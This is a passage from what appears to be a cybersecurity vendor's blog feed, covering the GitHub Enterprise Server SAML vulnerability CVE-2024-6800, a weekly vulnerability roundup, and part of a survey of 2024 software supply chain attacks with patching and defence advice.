<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Decoding the GitHub Enterprise Server Vulnerability&nbsp;&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>The CVE-2024-6800 vulnerability affects all GitHub Enterprise Server (GHES) versions prior to 3.14, except versions 3.13.3, 3.12.8, 3.11.14, and 3.10.16. This broad range of affected versions means that a significant number of GHES installations are at risk.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The impact of CVE-2024-6800 is substantial, particularly because GHES is crucial for managing the source code of critical applications. Exploiting this vulnerability could lead to unauthorized access, allowing attackers to bypass authentication and gain unrestricted access to GHES instances.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>This access could enable them to view, alter, or delete sensitive source code and other important data. Additionally, with administrator privileges, attackers could manipulate code or configurations, potentially compromising the entire supply chain and leading to broader security breaches affecting downstream systems and users.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The vulnerability’s exposure is exacerbated by the fact that GHES instances are often accessible over the internet. This broad attack surface heightens the risk of exploitation, highlighting the need for organizations to mitigate the threat quickly.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Mitigation and Recommendations&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>To address the critical vulnerability CVE-2024-6800, GitHub has issued <a href="https://docs.github.com/en/enterprise-server@3.13/admin/release-notes#3.13.3" rel="noreferrer noopener nofollow" target="_blank">essential security updates</a> for GitHub Enterprise Server (GHES). Organizations using GHES are strongly encouraged to implement immediate measures to mitigate the risks associated with this vulnerability. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Administrators should promptly upgrade to the latest GHES version, which includes crucial patches designed to fix the XML signature wrapping issue. This will secure GHES instances against potential <a href="https://cyble.com/knowledge-hub/what-is-a-cyber-attack/">cyber attacks</a>. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Organizations should also review their security policies and actively monitor their systems for any suspicious activity that might indicate attempts to exploit the vulnerability. Ensuring that access controls are properly configured and regularly reviewed will help in preventing unauthorized access.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Moreover, the security update addressing CVE-2024-6800 is included in GHES version 3.13.3. This release not only tackles the critical vulnerability but also introduces several improvements and fixes. Key security enhancements in this update include a specific fix for CVE-2024-6800, which resolves the XML signature wrapping vulnerability by blocking unauthorized access through forged SAML responses. Additionally, the update addresses several medium-severity vulnerabilities affecting both public and private repositories, contributing to improved overall security.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>GHES version 3.13.3 also brings new features and enhancements. It includes improved diagnostic tools that allow users to view app states for gists, networks, and wikis, and the spokesctl check command now diagnoses and resolves issues with empty repository networks. Configuration tools have been enhanced for better management and diagnostics, including improvements to the ghe-config-apply process and more effective handling of configuration logs.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The update resolves various bugs affecting system stability and user experience. It addresses issues related to configuration runs, unnecessary connections, and failures in Dependency Graph updates. It also contains user experience improvements, including fixes for problems with GitHub Actions, backup and restoration processes, and instance management.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Conclusion&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>CVE-2024-6800 represents a challenge to organizations using GitHub Enterprise Server. The XML signature wrapping flaw poses serious risks, including unauthorized access and compromised systems. Organizations should upgrade to GHES version 3.13.3 to address this <a href="https://cyble.com/solutions/vulnerability-management/">vulnerability</a> and take advantage of the latest security improvements.  </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Regular updates and proactive monitoring are vital for protecting development environments from potential threats. For further details on the update and to access the latest security patches, organizations should refer to GitHub's official documentation and follow the recommended actions.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p>The post <a href="https://cyble.com/blog/saml-exploit-github-cve-2024-6800/" rel="nofollow">The SAML Exploit That Could Take Down GitHub: What You Need to Know About CVE-2024-6800 </a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Mon, 26 Aug 2024 10:18:36 +0000</pubDate>
</item>
<item>
<title>Weekly IT Vulnerability Report for August 20, 2024: Urgent Fixes Recommended for GitHub, PHP, Windows, and SAP</title>
<link>https://cyble.com/blog/weekly-it-vulnerability-report-august-2024/</link>
<guid>https://cyble.com/blog/weekly-it-vulnerability-report-august-2024/</guid>
<content:encoded><![CDATA[
<p><img alt="Weekly IT Vulnerability Report" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="600" src="https://cyble.com/wp-content/uploads/2024/08/Blog-Image1.webp" tabindex="0" width="1200" /></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Key Takeaways&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:list {"ordered":true,"start":1} --></p>
<ol class="wp-block-list" start="1"><!-- wp:list-item --></p>
<li>CVE-2024-6800 (GitHub Enterprise Server) poses the risk of data breaches and supply chain attacks. </li>
<p><!-- /wp:list-item --></ol>
<p><!-- /wp:list --></p>
<p><!-- wp:list {"ordered":true,"start":2} --></p>
<ol class="wp-block-list" start="2"><!-- wp:list-item --></p>
<li>CVE-2024-38063, a critical Remote Code Execution (RCE) vulnerability in Windows, may enable <a href="https://cyble.com/knowledge-hub/what-is-a-cyber-attack/">cyber attacks</a> on a mass scale, affecting both government and private entities. </li>
<p><!-- /wp:list-item --></ol>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Overview&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><a href="https://cyble.com/blog/">Cyble Research and Intelligence Labs </a>(CRIL) researchers investigated 12 vulnerabilities from August 14 to August 20, ranging in severity from medium to critical. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>CRIL researchers also observed five instances of vulnerabilities and Proof of Concept (POC) exploits discussed on underground channels and cybercrime forums during that period.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Based on Cyble’s assessments of the relative cyber threats presented by the vulnerabilities and exploits, five vulnerabilities stand out as warranting priority attention by security teams. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">The Week’s Top Vulnerabilities&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Here is a deeper analysis of those five vulnerabilities identified by Cyble researchers.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">1. CVE-2024-6800: XML Signature Wrapping Vulnerability in GitHub Enterprise Server&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>This XML signature wrapping vulnerability in GitHub Enterprise Server (GHES) has significant implications for organizations that use this platform for source code management and collaboration. An attacker with direct network access can forge a SAML response to provision and/or gain access to a user with site administrator privileges, resulting in unauthorized access to the instance without prior authentication. This <a href="https://cyble.com/solutions/vulnerability-management/">vulnerability</a> affects GHES, a widely used platform for managing source code, making it a high-priority fix. Since GHES is used by organizations to manage the source code of their applications, an attacker could exploit a vulnerability by stealing sensitive information or leveraging unauthorized admin privileges to carry out <a href="https://cyble.com/blog/surge-in-software-supply-chain-attacks-heightens-third-party-vigilance/">supply chain attacks</a>. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Internet Exposure?</strong> Yes&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Patch Available?</strong> This vulnerability affected all versions of GitHub Enterprise Server prior to 3.14 and was fixed in versions 3.13.3, 3.12.8, 3.11.14, and 3.10.16.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">2. CVE-2024-4577: Critical Vulnerability in PHP&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><a href="https://cyble.com/blog/cve-2024-4577-ongoing-exploitation-of-a-critical-php-vulnerability/">CVE-2024-4577</a>, a widespread critical vulnerability was initially discovered in May and affects PHP when using Apache and PHP-CGI on Windows. The PHP CGI module may misinterpret characters as PHP options, allowing a malicious user to pass options to the PHP binary being run, revealing the source code of scripts, and running arbitrary PHP code on the server. Recently, researchers discovered that unknown attackers had deployed a newly discovered backdoor dubbed Msupedge on an educational institute’s Windows systems in Taiwan, likely by exploiting this vulnerability. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Internet Exposure?</strong> Yes&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Patch Available?</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-4577" rel="noreferrer noopener" target="_blank">Yes</a>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">3. CVE-2024-38193: Elevation of Privilege Vulnerability in Windows Ancillary Function Driver&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>The Windows Ancillary Function Driver is an entry point into the Windows Kernel for the Winsock protocol. A high-severity elevation of privilege vulnerability in this driver was disclosed, and researchers believe the Lazarus hacking group may have leveraged it to elevate privileges and install the FUDModule rootkit.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Internet Exposure?</strong> No&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Patch Available?</strong> <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38193" rel="noreferrer noopener" target="_blank">Yes</a>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">4. CVE-2024-38063: Critical TCP/IP Remote Code Execution Vulnerability in Windows&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>A critical TCP/IP remote code execution vulnerability in Windows was identified, allowing attackers to trigger buffer overflows that can be used to execute arbitrary code on vulnerable Windows 10, Windows 11, and Windows Server systems. This vulnerability is considered wormable, allowing a remote, unauthenticated attacker to gain elevated code execution by sending specially crafted IPv6 packets to an affected target.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Internet Exposure?</strong> No&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Patch Available?</strong> <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38063" rel="noreferrer noopener nofollow" target="_blank">Yes</a> </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">5. CVE-2024-41730: SAP BusinessObjects Business Intelligence Vulnerability&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>A critical vulnerability in SAP BusinessObjects Business Intelligence (SAP BO) affects organizations that use this centralized suite of reporting and analytics tools for business intelligence. An unauthorized user can obtain a logon token using a REST endpoint, resulting in a high impact on confidentiality, integrity, and availability.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Internet Exposure?</strong> No&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Patch Available?</strong> <a href="https://support.sap.com/en/my-support/knowledge-base/security-notes-news/august-2024.html" rel="noreferrer noopener nofollow" target="_blank">Yes</a> </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Vulnerabilities and Exploits Discussed in the Underground&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>In addition to the top vulnerabilities, Cyble researchers observed several other vulnerabilities being discussed in underground forums and channels, raising the profile of these vulnerabilities among attackers. These include:&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li><strong>CVE-2024-40348:</strong> A high-severity vulnerability in the Bazaar API, allowing unauthenticated attackers to execute directory traversal.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li><strong>CVE-2024-30088:</strong> A high-severity elevation of privilege vulnerability in the Windows Kernel.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li><strong>CVE-2024-38856:</strong> An incorrect authorization vulnerability in Apache OFBiz, allowing unauthenticated <a href="https://cyble.com/knowledge-hub/what-is-edr/">endpoints</a> to execute screen rendering code of screens if certain preconditions are met. </li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li><strong>CVE-2024-38213:</strong> A Windows Mark of the Web security feature bypass vulnerability.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li><strong>CVE-2024-2212:</strong> An Eclipse ThreadX vulnerability that can lead to integer wraparound, under-allocations, and heap buffer overflows.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Our Recommendations&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>To protect against these vulnerabilities and exploits, organizations should implement the following <a href="https://cyble.com/knowledge-hub/cybersecurity/">cybersecurity</a> best practices: </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">1. Implement the Latest Patches&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>To mitigate vulnerabilities and protect against exploits, regularly update all software and hardware systems with the latest patches from official vendors.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">2. Implement a Robust Patch Management Process&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Develop a comprehensive patch management strategy that includes inventory management, patch assessment, testing, deployment, and verification. Automate the process where possible to ensure consistency and efficiency.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">3. Implement Proper Network Segmentation&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Divide your network into distinct segments to isolate critical assets from less secure areas. Use <a href="https://cyble.com/knowledge-hub/what-is-firewall/">firewalls,</a> VLANs, and access controls to limit access and reduce the attack surface exposed to potential threats. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">4. Incident Response and Recovery Plan&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Create and maintain an<a href="https://cyble.com/knowledge-hub/what-is-incident-response/"> incident response plan</a> that outlines procedures for detecting, responding to, and recovering from security incidents. Regularly test and update the plan to ensure its effectiveness and alignment with current threats. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">5. Monitoring and Logging Malicious Activities&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Implement comprehensive monitoring and logging solutions to detect and analyze suspicious activities. Use SIEM (Security Information and Event Management) systems to aggregate and correlate logs for real-time threat detection and response.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">6. Keep Track of Security Alerts&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Subscribe to security advisories and alerts from official vendors, CERTs, and other authoritative sources. Regularly review and assess the impact of these alerts on your systems and take appropriate actions.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">7. Visibility into Assets&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Maintain an up-to-date inventory of all internal and external assets, including hardware, software, and network components. Use asset management tools and continuous monitoring to ensure comprehensive visibility and control over your IT environment.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">8. Strong Password Policy&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Change default passwords immediately and enforce a strong password policy across the organization. Implement <a href="https://cyble.com/blog/multi-factor-authentication-mfa-is-a-part-of-your-cyber-hygiene/">multi-factor authentication </a>(MFA) to provide an extra layer of security and significantly reduce the risk of unauthorized access. </p>
<p><!-- /wp:paragraph --></p>
<p>The post <a href="https://cyble.com/blog/weekly-it-vulnerability-report-august-2024/" rel="nofollow">Weekly IT Vulnerability Report for August 20, 2024: Urgent Fixes Recommended for GitHub, PHP, Windows, and SAP </a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Mon, 26 Aug 2024 10:18:32 +0000</pubDate>
</item>
<item>
<title>Surge in Software Supply Chain Attacks Demands Heightened Third-Party Vigilance</title>
<link>https://cyble.com/blog/surge-in-software-supply-chain-attacks-heightens-third-party-vigilance/</link>
<guid>https://cyble.com/blog/surge-in-software-supply-chain-attacks-heightens-third-party-vigilance/</guid>
<content:encoded><![CDATA[
<p><img alt="Blog Image" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="600" src="https://cyble.com/wp-content/uploads/2024/08/Blog-Image2-1.webp" tabindex="0" width="1200" /></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Key Takeaways&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Attacks on the software supply chain have occurred at a rate of at least one every two days in 2024.&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>U.S. companies and IT providers have been by far the most frequent targets, accounting for one-third of all software supply chain attacks.&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>The UK, Australia, Germany, India and Japan have also been frequent targets, as have the aerospace &amp; defense, healthcare and manufacturing sectors.&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>These <a href="https://cyble.com/knowledge-hub/what-is-a-cyber-attack/">cyber attacks</a> are particularly damaging and costly because of their multiplication factor on downstream victims and trusted access to customer environments.&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Even when the codebase isn’t breached, customer databases contain critical information for threat actors to use in phishing, spoofing and credential attacks. </li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>A defense-in-depth approach is required to reduce risk, based on principles of <a href="https://cyble.com/knowledge-hub/what-is-zero-trust-framework/">zero trust</a>, cyber resilience, and secure code practices.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Overview&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Software supply chain attacks burst into public consciousness in 2020 with news of the SolarWinds Orion attack, and a Kaseya VSA ransomware attack in mid-2021 further underscored the risks that third-party software suppliers can pose to their unsuspecting customers.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Attacks resulting from infiltration of an IT supplier’s code base are relatively rare, but the software supply chain – the code, dependencies and applications that all modern organizations rely on – is a source of near-constant vulnerabilities and cyberattacks that place all organizations at risk.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Because of their trusted access to IT environments, a category of security tools called third-party risk management (TPRM) has evolved to monitor the security of trusted providers – and to alert downstream users when the risk from these services has increased.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Because of their trusted access to customer environments, third-party providers are one of the biggest targets for threat actors. While codebase breaches are relatively rare, a breach of any partner’s business environment can lead to sensitive data being leaked that could give attackers a critical advantage in breaching other environments, including <a href="https://cyble.com/knowledge-hub/what-is-phishing/">phishing</a>, spoofing and credential attacks. And because of the interconnectedness and increasing digital nature of the physical supply chain, any manufacturer or supplier with downstream distribution can be considered a cyber risk. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>We’ll look at the frequency and nature of supply chain attacks in 2024 before we focus on important defenses that all organizations with trusted partners should have in place.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">How Common Are Software Supply Chain Attacks?&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Successful supply chain attacks have become a near-daily occurrence in 2024, according to Cyble <a href="https://cyble.com/knowledge-hub/what-is-cyber-threat-intelligence/">threat intelligence</a> data.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Cyble’s <a href="https://cyble.com/solutions/dark-web-monitoring/">dark web monitoring</a> found 90 cybercriminal claims of successful supply chain attacks in a six-month period that encompassed February 2024 to mid-August 2024.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Not surprising given their reach, IT providers suffered the greatest number of those breaches, 30, or one-third of the total, followed by technology product companies, which experienced 14 of the 90 breaches.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Aerospace &amp; defense (9 breaches), manufacturing (9 breaches), and healthcare (8 breaches) were the next most frequent victims of supply chain attacks.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>In all, 22 of the 25 sectors tracked by Cyble threat researchers have experienced a supply chain attack in 2024 (chart below).&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56651,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Supply Chain Attacks by Sector 2024" class="wp-image-56651" src="https://cyble.com/wp-content/uploads/2024/08/supply-chain.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>The U.S. experienced by far the greatest number of supply chain breaches claimed on the <a href="https://cyble.com/knowledge-hub/what-is-the-dark-web/">dark web</a> – 31 in all – followed by the UK (10). Germany and Australia each had five, and Japan and India had four each.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">A Look at the Nature of Supply Chain Attacks in 2024&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Supply chain attacks in 2024 have ranged from the theft of business and customer data to the theft and hijacking of source code, but regardless of the sensitive data access, all such attacks pose a serious threat because of the reach of these suppliers. A recent report from Cyentia found that 99% of Global 2000 companies are directly connected to a vendor that has been hit by a supply chain breach. Here is a look at the range and nature of supply chain attacks and breaches thus far in 2024.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">jQuery&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>On July 5, a supply chain attack on the JavaScript npm package manager involving trojanized versions of jQuery was discovered by cybersecurity researchers. The attack targeted the popular JavaScript library jQuery by distributing trojanized versions through npm, GitHub, and jsDelivr. The attackers modified the legitimate jQuery code to exfiltrate sensitive form data from websites. The attack's scope was significant, impacting multiple platforms and package names. The attackers used tactics like obfuscation and misleading version warnings. The attack underscored the urgent need for developers and website owners to verify package authenticity and scrutinize code for suspicious modifications to mitigate supply chain attacks.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Polyfill&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>In late June, a widespread supply chain attack hit over 100,000 websites, including many well-known names, originating from a fake domain that impersonated the Polyfill.js library to inject malware that redirected users to sports betting or pornographic sites. The malware dynamically generated based on HTTP headers, making detection challenging. The attack highlighted the risks of using external code libraries and the importance of vigilance in website security. Mitigation steps included removing cdn.polyfill.io, replacing it with secure alternatives, and caution against relying on unknown entities for JavaScript. The incident underscored the security implications of third-party scripts and the potential for malicious takeovers of widely deployed projects.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Programming Language Breach&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>On July 26, <a href="https://cyble.com/knowledge-hub/cyber-threat-actor-and-types/">threat actor </a>(TA) IntelBroker, posting on the BreachForums cybercrime forum, claimed to offer unauthorized access to a node package manager (npm) and GitHub account pertaining to an undisclosed programming language, for US $20,000. The TA said the offer also includes access to the X (Twitter) account of the associated organization with about 100,000 followers, and private repositories with privileges to push and clone commits. Below is a screenshot of the TA’s claims: </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56652,"sizeSlug":"large","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-large"><img alt="" class="wp-image-56652" src="https://cyble.com/wp-content/uploads/2024/08/suply-chain-1024x505.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">CDK Global Inc.&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>On June 19, automotive dealership software provider CDK Global Inc. was hit by a <a href="https://cyble.com/knowledge-hub/what-is-ransomware/">ransomware</a> attack reportedly perpetrated by the Black Suit ransomware group that disrupted sales and inventory operations of many North American auto dealers, including large dealer networks belong to Group1 Automotive Inc., AutoNation Inc., Premier Truck Group, and Sonic Automotive, all of which informed U.S. authorities that they experienced a multi-week service outage and disruption to dealership operations, including those supporting sales, customer relationship management systems, inventory and accounting functions. However, none of the CDK Global customers reported any malicious activity within their networks, suggesting the attack may have been limited to a service disruption.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Insula Group Pty Ltd.&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>On July 25, BianLian ransomware group claimed to compromise Australia-based Insula Group Pty Ltd. The company provides software solutions used in residential construction and finance broking industries. The ransomware group allegedly exfiltrated 400 GB of documents that included project data, construction data, client information, server data, and company source code.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Access Offered to More than 400 Companies&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>On June 15, IntelBroker, again appearing on BreachForums, offered to sell unauthorized access to more than 400 companies compromised via an undisclosed third-party contractor. The data allegedly included access to integration services of Jira, Bamboo, Bitbucket, GitHub, GitLab, SSH, SFTP, DA, Zabbix, AWS S3, AWS EC2, SVN and Terraform. Additionally, the TA also provided revenue of four significant impacted organizations. Open-source research based on the companies’ revenue and location suggested the impacted organizations could be Lockheed Martin Corporation, Samsung Electronics Co Ltd, General Dynamics, and Apple Inc.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Smart-ID&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>On June 21, the functionality of the Smart-ID electronic identification and authorization app was disrupted after a cyberattack, resulting in difficulties accessing internet banking and other e-services in Latvia, Estonia and elsewhere.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Cartier International SNC&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>On Aug 5, IntelBroker leaked data on BreachForums allegedly pertaining to Cartier International SNC, a France-based luxury goods brand. The TA said the data was stolen from the U.S,-based BORN Group, a global digital marketing agency that specializes in digital transformation and commerce solutions. The TA claimed the data was exfiltrated from AWS S3 storage and also leveraged a local file inclusion (LFI) vulnerability, which led to the exposure of internal files, images, and source code.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Code Base Injection Not Required for Supply Chain Attack&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Threat actors don’t need to inject malicious code into a tech company’s code base to hack the software supply chain – they only need to exploit a zero-day or unpatched flaw that already exists, as happened in recent attacks hitting customers of MOVEit and Ivanti. And “software dependences,” like an open-source component used in proprietary software, can also introduce vulnerabilities, further expanding the attack surface.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
